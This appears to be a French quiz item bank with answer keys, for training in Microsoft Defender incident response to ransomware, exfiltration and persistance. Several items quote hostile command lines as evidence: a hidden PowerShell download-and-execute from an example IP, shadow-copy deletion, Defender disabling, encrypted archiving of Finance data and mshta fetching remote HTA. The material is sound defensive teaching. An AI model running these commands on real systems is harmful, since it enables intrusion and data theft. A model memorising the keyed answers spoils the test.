@@ -1,0 +1,316 @@
+@@ module=4
+@@ section=Rançongiciels et activités précurseurs
+
+### Rançongiciel opéré par l'humain
+@ niveau=D ref=ir-ransomware
+?: Quelle caractéristique distingue un rançongiciel « opéré par l'humain » d'un rançongiciel de masse automatisé ?
++: Des attaquants mènent une intrusion préalable (accès initial, élévation de privilèges, mouvement latéral, désactivation des défenses, exfiltration) avant de déployer le chiffrement sur un maximum de systèmes.
+-: Il se propage uniquement par clé USB. || Le vecteur n'est pas le critère distinctif.
+-: Il ne chiffre que les fichiers d'un seul poste. || Au contraire, l'objectif est l'impact maximal sur l'organisation.
+-: Il ne peut pas être détecté avant le chiffrement. || Les étapes préalables (reconnaissance, vol d'identifiants, désactivation de défenses) offrent de nombreuses occasions de détection.
+=: Les **rançongiciels opérés par l'humain** suivent une chaîne d'attaque complète, souvent sur plusieurs jours ou semaines : accès initial (identifiants volés, RDP exposé, vulnérabilité), découverte, vol d'identifiants, mouvement latéral, **inhibition de la récupération**, **exfiltration** (double extorsion), puis chiffrement simultané.
+T: La détection des **précurseurs** (outils de reconnaissance, Cobalt Strike, vol de LSASS, désactivation de Defender, suppression des clichés instantanés) est la clé. Defender XDR applique l'interruption automatique d'attaque à ces scénarios.
+!: Rançongiciel opéré par l'humain = intrusion complète avant chiffrement ; détecter les précurseurs.
+
+### Précurseurs à prioriser
+@ niveau=I ref=ir-ransomware,xdr-t-DeviceProcessEvents
+?: Parmi les événements suivants observés sur des serveurs le même soir, lesquels sont les plus caractéristiques d'une préparation de rançongiciel ? (Sélectionnez deux réponses.)
+@ multi=2
++: L'exécution de « vssadmin delete shadows /all /quiet » sur plusieurs serveurs.
++: Des tentatives de désactivation de l'antivirus Microsoft Defender (Set-MpPreference -DisableRealtimeMonitoring) et d'arrêt de services de sauvegarde.
+-: La mise à jour mensuelle de Windows via WSUS. || Activité de maintenance planifiée.
+-: Des connexions d'utilisateurs à Outlook le matin. || Activité normale.
+-: La création d'un rapport Power BI. || Activité métier normale.
+=: L'**inhibition de la récupération** (T1490 : suppression des clichés, du catalogue de sauvegarde) et l'**affaiblissement des défenses** (T1562.001 : désactivation de l'antivirus, arrêt des services de sécurité/sauvegarde) précèdent typiquement le chiffrement.
+T: La protection contre les falsifications empêche la désactivation de Defender. Ces signaux justifient une réponse immédiate : isolement des serveurs touchés, désactivation des comptes utilisés, recherche de l'outil de déploiement (GPO, PsExec, tâches planifiées).
+!: Précurseurs forts : suppression des clichés/sauvegardes et désactivation des défenses.
+
+### Confinement d'un rançongiciel en cours
+@ niveau=A ref=ir-ransomware,mde-response-device
+?: Le chiffrement a commencé sur deux serveurs de fichiers et se propage via un compte d'administrateur de domaine compromis. Quelles actions de confinement sont prioritaires ? (Sélectionnez deux réponses.)
+@ multi=2
++: Isoler les appareils touchés et ceux d'où provient la propagation (via MDE), ou contenir les appareils non gérés.
++: Désactiver le compte d'administrateur compromis (et les autres comptes utilisés par l'attaquant) dans AD et Entra ID.
+-: Payer immédiatement la rançon pour stopper la propagation. || Le paiement n'arrête pas une propagation en cours et n'est pas une mesure de confinement.
+-: Lancer une restauration des sauvegardes sur les serveurs encore connectés. || Restaurer avant le confinement expose les sauvegardes au chiffrement.
+-: Redémarrer tous les serveurs pour arrêter les processus. || Perte des preuves volatiles et risque de réexécution par persistance.
+=: Le **confinement** vise à arrêter la propagation : **isoler** les appareils (MDE garde la connexion de gestion), **contenir** les appareils non gérés, **désactiver** les comptes compromis (MDI pour AD, Entra ID), bloquer les mécanismes de déploiement (GPO malveillante, tâches planifiées).
+T: L'**interruption automatique d'attaque** de Defender XDR applique précisément ces actions (contenir l'appareil, contenir/désactiver l'utilisateur) dans les scénarios de rançongiciel. Protéger les **sauvegardes** (hors ligne/immuables) avant toute restauration.
+!: Rançongiciel actif : isoler/contenir les appareils + désactiver les comptes utilisés ; restaurer seulement après confinement.
+
+### Restauration après rançongiciel
+@ niveau=I ref=ir-ransomware
+?: Après l'éradication d'un rançongiciel, quelle précaution est essentielle avant de restaurer les serveurs depuis les sauvegardes ?
++: Vérifier que les sauvegardes sont saines (antérieures à l'intrusion, sans persistance de l'attaquant) et que les vecteurs d'accès et comptes compromis ont été neutralisés.
+-: Restaurer la sauvegarde la plus récente sans vérification, car elle contient le moins de pertes de données. || Elle peut contenir la persistance de l'attaquant (installée avant le chiffrement).
+-: Restaurer directement sur le réseau de production avant la fin de l'enquête. || Risque de réinfection si l'attaquant a encore un accès.
+-: Désactiver la journalisation pour accélérer la restauration. || La surveillance renforcée est nécessaire après restauration.
+=: La **restauration** ne doit intervenir qu'après **éradication** (accès de l'attaquant supprimés, identifiants réinitialisés, y compris krbtgt si nécessaire) et sur des **sauvegardes vérifiées** : l'intrusion a souvent commencé bien avant le chiffrement, des sauvegardes récentes peuvent contenir des portes dérobées.
+T: Restaurer d'abord les services critiques dans un environnement contrôlé, analyser les images (antivirus, chasse sur les IOC connus), puis remettre en production sous **surveillance renforcée** (règles temporaires, chasse ciblée).
+!: Restaurer après éradication, depuis des sauvegardes vérifiées antérieures à l'intrusion, puis surveiller.
+
+### Déploiement par stratégie de groupe
+@ niveau=A ref=mdi-alerts,ir-ransomware
+?: Le rançongiciel a été déployé simultanément sur 400 postes. L'enquête montre qu'une GPO nommée « Maintenance » a été créée la veille et lance un script depuis SYSVOL. Que traduit ce mécanisme et quelle mesure s'impose ?
++: L'attaquant a obtenu des droits élevés sur le domaine et utilise une modification de stratégie de domaine (T1484.001) pour déployer sa charge ; il faut désactiver/supprimer la GPO, préserver le script comme preuve et traiter la compromission des comptes à privilèges.
+-: Il s'agit d'une mise à jour légitime ; aucune mesure n'est nécessaire. || Une GPO inconnue lançant un script la veille d'un chiffrement massif est malveillante.
+-: Il suffit de supprimer le script de SYSVOL. || La GPO et les droits de l'attaquant resteraient en place.
+-: Il faut réinstaller uniquement les 400 postes. || Sans traiter le contrôle de l'annuaire, l'attaquant recommencerait.
+=: La création ou modification de **GPO** pour exécuter des scripts ou des tâches planifiées sur tout le parc (**T1484.001 – Group Policy Modification**) exige des privilèges d'administration du domaine. La réponse inclut la neutralisation de la GPO, l'analyse de la charge, l'identification du compte utilisé et la remédiation de la compromission de l'annuaire.
+T: Defender for Identity et l'audit AD (5136 – modification d'objet d'annuaire) aident à détecter les changements de GPO. MDE voit l'exécution du script sur les postes (processus lancés par gpscript.exe ou des tâches planifiées).
+!: GPO malveillante = compromission des privilèges du domaine ; neutraliser la GPO et traiter les comptes à privilèges.
+
+### Double extorsion
+@ niveau=I ref=ir-ransomware
+?: Le groupe de rançongiciel affirme avoir volé 200 Go de données avant le chiffrement. Quelles sources consulter pour vérifier une exfiltration ? (Sélectionnez deux réponses.)
+@ multi=2
++: Les journaux réseau (pare-feu/proxy, DeviceNetworkEvents) pour des volumes sortants inhabituels vers des services de stockage ou des IP inconnues.
++: L'exécution d'outils de synchronisation/archivage (rclone, MEGAsync, 7-Zip, WinRAR) dans DeviceProcessEvents sur les serveurs de fichiers.
+-: Le Secure Score Microsoft. || Indicateur de posture, sans trace des transferts.
+-: Les recommandations de Defender for Cloud uniquement. || Elles décrivent des configurations, pas des transferts passés.
+-: La table Heartbeat. || Disponibilité des agents.
+=: La **double extorsion** combine vol de données et chiffrement. L'exfiltration laisse des traces : **volumes sortants** anormaux (CommonSecurityLog, DeviceNetworkEvents, journaux de proxy), **outils** d'archivage et de transfert (rclone vers des stockages cloud, T1567.002 ; 7-Zip/WinRAR, T1560), connexions vers des hébergeurs de fichiers.
+T: Exemples de chasse : `DeviceProcessEvents | where FileName in~ ("rclone.exe") or ProcessCommandLine has_any ("mega", "copy", "--config")`. Croiser avec les accès aux partages sensibles (DeviceFileEvents, journaux SMB) pour identifier les données concernées et les obligations de notification.
+!: Vérifier l'exfiltration : volumes réseau sortants + outils d'archivage/transfert (rclone, 7-Zip…).
+
+### Outil de commande et contrôle sur des serveurs
+@ niveau=I ref=xdr-t-DeviceNetworkEvents,xdr-t-DeviceProcessEvents
+?: MDE détecte un « beacon » Cobalt Strike sur un serveur. Quelle démarche permet d'identifier rapidement les autres systèmes infectés ?
++: Extraire les indicateurs (hachage du binaire/DLL, IP et domaines de C2, nom de canal nommé, ligne de commande) et les rechercher dans tout le parc via la chasse avancée, puis isoler les appareils trouvés.
+-: Attendre que d'autres alertes se déclenchent. || Les beacons peuvent rester discrets ; une chasse proactive est nécessaire.
+-: Réinstaller le seul serveur détecté. || D'autres systèmes peuvent être compromis.
+-: Bloquer tout le trafic HTTPS sortant de l'entreprise. || Disproportionné et inutile si les IOC sont connus.
+=: Le **pivot sur les indicateurs** (fichiers, réseau, processus) via la **chasse avancée** révèle la portée de l'infection. Les beacons utilisent souvent HTTPS, DNS ou des canaux nommés (SMB) pour communiquer entre machines compromises.
+T: Requêtes utiles : DeviceNetworkEvents sur les IP/domaines de C2, DeviceProcessEvents/DeviceImageLoadEvents sur les hachages, DeviceEvents (NamedPipeEvent) pour les canaux nommés. Bloquer ensuite les IOC (indicateurs MDE, pare-feu) et rechercher le vecteur d'accès initial.
+!: Un implant trouvé = pivoter sur ses IOC dans tout le parc (chasse avancée) avant d'éradiquer.
+
+### Accès initial par RDP exposé
+@ niveau=I ref=la-t-SecurityEvent
+?: L'enquête sur un rançongiciel révèle que le premier accès s'est fait par RDP sur un serveur exposé directement sur Internet, avec un compte local au mot de passe faible. Quelle mesure corrige durablement ce vecteur ?
++: Supprimer l'exposition directe de RDP (accès via VPN/passerelle avec MFA ou accès juste-à-temps), et renforcer/gérer les comptes locaux (LAPS, mots de passe uniques).
+-: Changer le port RDP de 3389 à 3390. || L'obscurcissement du port ne résiste pas aux scanners.
+-: Désactiver la journalisation des ouvertures de session RDP. || Réduirait la visibilité sans corriger le problème.
+-: Bloquer les adresses IP de l'attaquant uniquement. || L'attaquant changera d'IP ; l'exposition reste.
+=: Les **services d'accès distant exposés** (T1133) et les **comptes valides faibles** (T1078) sont des vecteurs majeurs. La correction consiste à **supprimer l'exposition** (VPN avec MFA, Azure Bastion, accès juste-à-temps de Defender for Cloud) et à gérer les mots de passe locaux (Windows LAPS).
+T: Defender for Cloud signale les ports de gestion ouverts sur Internet et propose l'accès juste-à-temps (JIT) pour les VM Azure. La surface d'attaque externe (Defender EASM) identifie les services exposés.
+!: RDP exposé = supprimer l'exposition (VPN/MFA, Bastion, JIT) + LAPS ; changer le port ne suffit pas.
+
+### Mode Audit vs mode Bloquer contre un rançongiciel
+@ niveau=I ref=mde-asr-overview,mde-cfa
+?: Après un incident, l'audit révèle que la règle ASR « Utiliser une protection avancée contre les rançongiciels » et l'accès contrôlé aux dossiers étaient configurés en mode Audit. Quel est l'enseignement principal ?
++: En mode Audit, ces protections ne font que journaliser : elles n'ont rien bloqué. Après validation des exclusions nécessaires, elles doivent passer en mode Bloquer.
+-: Le mode Audit bloque les menaces les plus graves. || Le mode Audit ne bloque jamais.
+-: Ces protections sont inutiles contre les rançongiciels. || Elles réduisent fortement les capacités de chiffrement et de lancement de charges.
+-: Il faut les désactiver car elles ont généré des événements. || Les événements d'audit sont précisément la base pour passer en mode Bloquer.
+=: Le **mode Audit** sert à évaluer l'impact avant activation ; il **ne bloque pas**. Un déploiement resté en Audit au-delà de la phase de test laisse une fausse impression de protection.
+T: Utiliser les rapports ASR et DeviceEvents (`*Audited`) pour identifier les applications légitimes à exclure, puis basculer en Bloquer. Le retour d'expérience doit suivre ces écarts de configuration (Secure Score, recommandations de configuration).
+!: Audit = journalisation seule ; une protection anti-rançongiciel efficace doit être en mode Bloquer.
+
+### Note de rançon et chasse
+@ niveau=D ref=xdr-t-DeviceFileEvents
+?: Un fichier « LISEZ-MOI-RESTAURATION.txt » apparaît sur plusieurs serveurs. Quelle requête de chasse avancée permet de lister rapidement tous les appareils touchés ?
++: ```kqlx
+DeviceFileEvents
+| where Timestamp > ago(2d)
+| where ActionType == "FileCreated"
+| where FileName =~ "LISEZ-MOI-RESTAURATION.txt"
+| summarize Fichiers = count(), Premier = min(Timestamp) by DeviceName, InitiatingProcessFileName, InitiatingProcessAccountName
+| order by Premier asc
+```
+-: ```kqlx
+DeviceLogonEvents
+| where Timestamp > ago(2d)
+| where AccountName =~ "LISEZ-MOI-RESTAURATION.txt"
+```
+|| Un nom de fichier n'est pas un compte.
+-: ```kqlx
+DeviceNetworkEvents
+| where Timestamp > ago(2d)
+| where RemoteUrl has "LISEZ-MOI"
+```
+|| La note de rançon est un fichier local, pas une URL.
+-: ```kqlx
+EmailEvents
+| where Timestamp > ago(2d)
+| where Subject has "RESTAURATION"
+```
+|| La note n'est pas envoyée par e-mail.
+=: Les notes de rançon sont des **fichiers créés** dans de nombreux dossiers : **DeviceFileEvents** (ActionType FileCreated) permet de lister les appareils touchés, le **processus créateur** (souvent le binaire de chiffrement) et le **compte** utilisé, triés par heure d'apparition.
+T: La première apparition indique souvent le patient zéro ou le point de départ du déploiement. Le processus initiateur fournit le hachage à rechercher et bloquer. Combiner avec les renommages massifs de fichiers.
+R: Une ligne par appareil, processus et compte, avec le nombre de notes et la première création.
+!: Notes de rançon = DeviceFileEvents (FileCreated) → appareils, processus chiffreur, compte.
+
+@@ section=Exfiltration, scripts, persistance et mouvement latéral
+
+### Exfiltration vers un stockage cloud personnel
+@ niveau=I ref=mdca-discovery,xdr-t-DeviceProcessEvents
+?: Un employé sur le départ est soupçonné d'avoir copié des fichiers sensibles vers son stockage cloud personnel. Quelles sources sont les plus pertinentes ? (Sélectionnez deux réponses.)
+@ multi=2
++: Cloud Discovery / Defender for Cloud Apps (applications cloud utilisées et volumes de chargement depuis les postes MDE).
++: Les journaux Microsoft 365 (Purview Audit, CloudAppEvents) pour les téléchargements massifs depuis SharePoint/OneDrive avant le transfert.
+-: Le journal d'activité Azure. || Il trace le plan de contrôle Azure, pas les transferts de fichiers d'un employé.
+-: La table Heartbeat. || Disponibilité des agents.
+-: Le rapport de santé des capteurs MDI. || Sans rapport avec l'exfiltration de fichiers.
+=: L'exfiltration vers le cloud personnel (T1567.002) s'observe par : l'**usage d'applications cloud** et les volumes chargés (Cloud Discovery alimenté par MDE), les **téléchargements massifs** préalables depuis Microsoft 365 (audit, CloudAppEvents), la **DLP des terminaux** (copie vers USB, chargement vers des sites non autorisés).
+T: Ces enquêtes impliquent la confidentialité et le droit du travail : coordination avec RH et juridique, et éventuellement Insider Risk Management (pseudonymisation). Prévention : application non approuvée bloquée, DLP, étiquettes de confidentialité.
+!: Exfiltration cloud personnelle = Cloud Discovery (MDCA/MDE) + audit Microsoft 365 + DLP.
+
+### Script PowerShell téléchargé en mémoire
+@ niveau=A ref=xdr-t-DeviceEvents,mde-custom-data
+?: Une ligne de commande montre `powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.9/a.ps1')"`. Le script n'a jamais été écrit sur disque. Où chercher son contenu ?
++: Dans la télémétrie des scripts capturée par l'antivirus (AMSI) et les événements PowerShell de MDE (par exemple DeviceEvents, ActionType « PowerShellCommand »), et dans les journaux de blocs de script PowerShell (événement 4104) s'ils sont collectés.
+-: Dans DeviceFileEvents, car tout script est écrit sur disque. || IEX exécute le contenu téléchargé en mémoire (sans fichier).
+-: Dans EmailAttachmentInfo. || Le script provient d'une URL, pas d'une pièce jointe.
+-: Nulle part : un script en mémoire n'est jamais visible. || AMSI et la journalisation des blocs de script exposent le contenu.
+=: Les attaques **sans fichier** (T1059.001 + T1105) téléchargent et exécutent le script en mémoire. **AMSI** transmet le contenu à l'antivirus ; MDE expose des événements PowerShell dans **DeviceEvents** ; la **journalisation des blocs de script** (Microsoft-Windows-PowerShell/Operational, **4104**) enregistre le code exécuté, collectable dans Sentinel via une DCR personnalisée (XPath).
+T: Également : DeviceNetworkEvents pour la connexion vers 198.51.100.9 (processus powershell.exe) et le proxy web pour le contenu. Les options `-nop` (sans profil) et `-w hidden` (fenêtre masquée) sont typiques d'une exécution malveillante.
+!: Script en mémoire : AMSI/DeviceEvents (PowerShellCommand) et journalisation des blocs de script (4104).
+
+### Persistance par abonnement WMI
+@ niveau=A ref=mde-asr,xdr-t-DeviceEvents
+?: Un poste continue d'exécuter une charge malveillante après suppression de toutes les tâches planifiées et clés Run. Quel mécanisme de persistance moins visible faut-il examiner, et quelle protection existe ?
++: Les abonnements aux événements WMI (filtres, consommateurs et liaisons), que la règle ASR « Bloquer la persistance via un abonnement aux événements WMI » permet de bloquer.
+-: Le fichier hosts. || Il redirige la résolution de noms, il ne relance pas de charge.
+-: Le fond d'écran de l'utilisateur. || Aucun rôle de persistance.
+-: La corbeille. || Aucun rôle de persistance.
+=: La **persistance WMI** (T1546.003) associe un **filtre** d'événement (par exemple « toutes les 60 s » ou « au démarrage »), un **consommateur** (CommandLineEventConsumer, ActiveScriptEventConsumer) et une **liaison**. Elle survit aux redémarrages et échappe aux contrôles classiques.
+T: MDE enregistre des événements liés à WMI dans DeviceEvents (par exemple « WmiBindEventFilterToConsumer »). Live Response permet d'inventorier les abonnements (`persistence` / scripts PowerShell `Get-WmiObject -Namespace root\subscription`). La règle ASR dédiée bloque la création de ces abonnements.
+!: Persistance résistante : examiner les abonnements WMI ; règle ASR dédiée pour la bloquer.
+
+### Mouvement latéral via WMI et PsExec
+@ niveau=I ref=mde-asr,xdr-t-DeviceProcessEvents
+?: Vous observez sur plusieurs serveurs des processus cmd.exe lancés par wmiprvse.exe et des services PSEXESVC. Quelle conclusion et quelle protection préventive ?
++: Mouvement latéral par exécution distante (WMI et PsExec, T1047/T1569.002) ; la règle ASR « Bloquer les créations de processus provenant des commandes PSExec et WMI » réduit ce risque (en tenant compte des outils d'administration légitimes).
+-: Comportement normal de Windows Update. || Windows Update n'utilise pas PsExec.
+-: Exfiltration DNS. || Il s'agit d'exécution de commandes à distance.
+-: Activité d'impression réseau. || Sans rapport.
+=: **wmiprvse.exe** parent de cmd/powershell indique une commande exécutée via **WMI** à distance ; **PSEXESVC** est le service installé par **PsExec**. Ces techniques d'administration sont très utilisées par les attaquants pour se déplacer.
+T: La règle ASR peut gêner des outils de gestion (SCCM utilise WMI) : tester en Audit. Corréler avec DeviceLogonEvents (LogonType Network) pour identifier le compte et la source. MDI détecte également l'exécution de code à distance contre les DC.
+!: wmiprvse → cmd / PSEXESVC = exécution distante latérale ; ASR dédiée (en Audit d'abord).
+
+### Pass-the-hash
+@ niveau=A ref=mdi-alerts
+?: MDI lève « Suspected identity theft (pass-the-hash) » : un hachage NTLM d'un administrateur est utilisé depuis un poste où cet administrateur ne s'est jamais connecté. Quelles mesures de remédiation sont pertinentes ? (Sélectionnez deux réponses.)
+@ multi=2
++: Réinitialiser le mot de passe du compte dont le hachage est utilisé et investiguer le poste source (vol de LSASS).
++: Réduire l'exposition des identifiants : limiter les connexions d'administrateurs sur les postes (modèle de niveaux), Credential Guard, LAPS, groupe Protected Users.
+-: Augmenter la longueur des noms d'utilisateur. || Sans effet sur la réutilisation de hachages.
+-: Activer NTLMv1 pour la compatibilité. || NTLMv1 est encore plus faible.
+-: Ignorer l'alerte si l'administrateur est en congé. || Raison de plus pour investiguer : quelqu'un d'autre utilise son identité.
+=: Le **pass-the-hash** (T1550.002) réutilise le hachage NTLM volé (souvent depuis LSASS) pour s'authentifier sans mot de passe. Il faut changer le mot de passe (nouveau hachage), traiter le poste source et réduire l'exposition des identifiants à privilèges.
+T: Le **modèle d'accès par niveaux** (tiering) empêche les administrateurs du domaine de se connecter aux postes. **Protected Users** désactive NTLM et la mise en cache des identifiants pour ses membres. **Credential Guard** isole les secrets LSASS.
+!: Pass-the-hash : changer le mot de passe + traiter la source + réduire l'exposition (tiering, Protected Users, Credential Guard).
+
+### Exfiltration par e-mail
+@ niveau=I ref=xdr-t-EmailEvents
+?: Vous soupçonnez un utilisateur d'envoyer des données de l'entreprise vers sa messagerie personnelle. Quelle requête de chasse avancée est la plus adaptée ?
++: ```kqlx
+EmailEvents
+| where Timestamp > ago(30d)
+| where EmailDirection == "Outbound"
+| where SenderFromAddress =~ "j.lemaire@contoso.com"
+| where RecipientDomain in~ ("gmail.com", "outlook.fr", "yahoo.fr", "proton.me")
+| summarize Messages = count(), PiecesJointes = sum(AttachmentCount) by RecipientEmailAddress, bin(Timestamp, 1d)
+```
+-: ```kqlx
+EmailEvents
+| where Timestamp > ago(30d)
+| where EmailDirection == "Inbound"
+| where RecipientEmailAddress =~ "j.lemaire@contoso.com"
+```
+|| Messages reçus par l'utilisateur, pas envoyés.
+-: ```kqlx
+UrlClickEvents
+| where Timestamp > ago(30d)
+| where AccountUpn =~ "j.lemaire@contoso.com"
+```
+|| Clics sur des URL, sans lien avec l'envoi de messages.
+-: ```kqlx
+DeviceLogonEvents
+| where Timestamp > ago(30d)
+| where AccountName =~ "j.lemaire"
+```
+|| Ouvertures de session sur les appareils.
+=: **EmailEvents** avec `EmailDirection == "Outbound"` liste les messages sortants ; le filtre sur **RecipientDomain** (domaines de messagerie grand public) et l'agrégation des pièces jointes mesurent les envois vers l'extérieur.
+T: Compléter avec EmailAttachmentInfo (noms, types, étiquettes de confidentialité) et les alertes DLP Purview. Ces enquêtes doivent respecter les règles internes et le cadre légal (proportionnalité, information des représentants selon les juridictions).
+R: Les envois par jour vers chaque adresse personnelle avec le nombre de pièces jointes.
+!: Envois sortants = EmailEvents (EmailDirection Outbound, RecipientDomain).
+
+### Clé Run créée par un script
+@ niveau=I ref=xdr-t-DeviceRegistryEvents
+?: Pendant l'investigation d'un poste, vous trouvez la valeur de registre `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OneDriveUpdate` pointant vers `C:\Users\Public\odupd.exe`. Que faites-vous en priorité ?
++: Traiter la valeur comme une persistance malveillante probable : identifier le processus qui l'a créée (DeviceRegistryEvents), analyser le binaire, puis supprimer la persistance et le fichier après collecte des preuves.
+-: La conserver : le nom « OneDriveUpdate » prouve qu'elle est légitime. || Les attaquants imitent des noms légitimes (masquerading, T1036) ; OneDrive ne s'exécute pas depuis C:\Users\Public.
+-: Supprimer immédiatement la valeur sans enquête. || On perdrait l'origine de la persistance et d'éventuels autres mécanismes.
+-: Désactiver OneDrive dans toute l'organisation. || Sans rapport avec la cause.
+=: Un nom trompeur combiné à un **emplacement anormal** (C:\Users\Public) est un indicateur de **masquerading** et de persistance (T1547.001). On remonte à l'origine (processus initiateur, ligne de commande), on analyse le binaire (hachage, prévalence, analyse approfondie), puis on remédie (suppression de la valeur et du fichier, indicateur de blocage).
+T: Rechercher la même valeur ou le même hachage sur d'autres appareils via la chasse avancée. Vérifier les autres mécanismes de persistance (tâches, services, WMI).
+!: Nom légitime + chemin anormal = masquerading ; remonter à l'origine avant de supprimer.
+
+### Archivage avant exfiltration
+@ niveau=I ref=xdr-t-DeviceProcessEvents
+?: Sur un serveur de fichiers, MDE enregistre `7z.exe a -pP@ssw0rd -mhe=on C:\PerfLogs\d.7z \\SRV-FIC01\Finance`. Que révèle cette commande ?
++: La création d'une archive chiffrée (avec chiffrement des noms de fichiers) des données Finance dans un dossier peu surveillé, étape typique de collecte avant exfiltration (T1560.001).
+-: Une sauvegarde planifiée standard. || Une sauvegarde légitime n'utilise pas un mot de passe en clair vers C:\PerfLogs.
+-: La décompression d'un logiciel. || Le paramètre « a » ajoute à une archive (compression).
+-: Un nettoyage du disque. || Aucun fichier n'est supprimé.
+=: `7z a` crée une archive, `-p` définit un mot de passe et `-mhe=on` chiffre aussi les en-têtes (noms de fichiers masqués) : technique de **collecte et préparation à l'exfiltration** (T1560.001 Archive via Utility). Le dossier **C:\PerfLogs** est souvent choisi car rarement surveillé.
+T: Étapes suivantes : rechercher le transfert de l'archive (DeviceNetworkEvents, DeviceFileEvents sur d.7z, outils rclone/FTP), identifier le compte utilisé et la période, évaluer les données concernées (obligations de notification).
+!: Archive chiffrée de données sensibles dans un dossier discret = préparation d'exfiltration (T1560.001).
+
+### Exécution via mshta depuis un raccourci
+@ niveau=I ref=xdr-t-DeviceProcessEvents
+?: Un utilisateur a ouvert une archive ZIP contenant un fichier .lnk. MDE montre ensuite `mshta.exe https://cdn-docs.example/view.hta`. De quelle technique s'agit-il ?
++: Exécution par proxy d'un binaire système signé (T1218.005 – Mshta) déclenchée par un raccourci malveillant (T1204.002), pour exécuter du code HTA distant.
+-: Mise à jour automatique d'Office. || Office ne se met pas à jour via mshta et une URL externe.
+-: Défragmentation planifiée. || Sans rapport.
+-: Connexion RDP sortante. || Sans rapport.
+=: **mshta.exe** exécute des applications HTML (HTA) contenant du script ; appelé avec une **URL distante** depuis un **raccourci** ouvert par l'utilisateur, il permet d'exécuter du code en contournant certains contrôles d'application (binaire signé Microsoft).
+T: Défense : règles ASR (« Bloquer l'exécution des fichiers exécutables sauf s'ils répondent à des critères… », « Bloquer JavaScript ou VBScript pour lancer du contenu exécutable téléchargé »), contrôle d'application (WDAC/App Control) pour restreindre mshta, filtrage des pièces jointes .lnk/.iso/.zip.
+!: LNK → mshta URL distante = T1204.002 + T1218.005.
+
+### Partage administratif et copie de fichiers
+@ niveau=A ref=xdr-t-DeviceFileEvents
+?: Vous voulez identifier les fichiers exécutables copiés à distance via SMB sur des serveurs, et la machine source de la copie. Quelle requête est adaptée ?
++: ```kqlx
+DeviceFileEvents
+| where Timestamp > ago(1d)
+| where ActionType == "FileCreated"
+| where RequestProtocol == "Smb"
+| where FileName endswith ".exe" or FileName endswith ".dll" or FileName endswith ".ps1"
+| project Timestamp, DeviceName, FolderPath, FileName, SHA256, RequestSourceIP, RequestAccountName, ShareName
+```
+-: ```kqlx
+DeviceFileEvents
+| where Timestamp > ago(1d)
+| where ActionType == "FileDeleted"
+```
+|| Suppressions de fichiers, pas copies.
+-: ```kqlx
+DeviceNetworkEvents
+| where Timestamp > ago(1d)
+| where RemotePort == 445
+| summarize count() by DeviceName
+```
+|| Volume de connexions SMB sans identification des fichiers copiés.
+-: ```kqlx
+DeviceProcessEvents
+| where Timestamp > ago(1d)
+| where FileName =~ "explorer.exe"
+```
+|| Exécutions de l'Explorateur, sans lien avec les copies SMB.
+=: Pour les fichiers créés **à distance**, DeviceFileEvents renseigne **RequestProtocol** (par exemple Smb), **RequestSourceIP**, **RequestAccountName** et **ShareName** (ADMIN$, C$…). Cela identifie la **machine source** et le **compte** du mouvement latéral (T1570 – Lateral Tool Transfer).
+T: Les valeurs exactes de RequestProtocol dépendent des données (vérifier « Smb »/« SMB » avec `=~`). Corréler avec la création d'un service ou d'une tâche planifiée sur le serveur cible peu après.
+R: Les exécutables et scripts copiés via SMB avec la source et le compte.
+!: Copie distante = DeviceFileEvents.RequestProtocol/RequestSourceIP/RequestAccountName/ShareName.
+
+### Persistance cloud par application
+@ niveau=A ref=la-t-AuditLogs,la-t-MicrosoftGraphActivityLogs
+?: Après l'éradication d'une compromission Entra ID (mots de passe réinitialisés, sessions révoquées), l'attaquant continue de lire des boîtes aux lettres. Quelle persistance cloud est la plus probable ?
++: Une application ou un principal de service contrôlé par l'attaquant (secret ajouté, consentement accordé, permissions Graph d'application) qui accède aux données indépendamment des utilisateurs.
+-: Une règle ASR mal configurée. || Les règles ASR concernent les terminaux.
+-: Un cookie de navigateur sur le poste du RSSI. || Les sessions ont été révoquées ; l'accès continu sans utilisateur pointe vers une identité d'application.
+-: Un cache DNS obsolète. || Sans rapport.
+=: Les attaquants persistent dans le cloud via des **applications** (T1098.001 – identifiants supplémentaires, T1528 – jetons d'application) : ajout de secrets/certificats à une application existante, création d'une application avec permissions **Mail.Read** (application), consentement administrateur. Ces accès ne dépendent pas des mots de passe utilisateurs.
+T: Rechercher dans AuditLogs : « Add service principal credentials », « Update application – Certificates and secrets management », « Add app role assignment to service principal », « Consent to application ». Puis AADServicePrincipalSignInLogs et MicrosoftGraphActivityLogs pour l'usage. Remédiation : retirer les identifiants/permissions, désactiver l'application, revoir les propriétaires d'applications.
+!: Accès persistant sans utilisateur = application/principal de service compromis ; vérifier AuditLogs et journaux Graph.
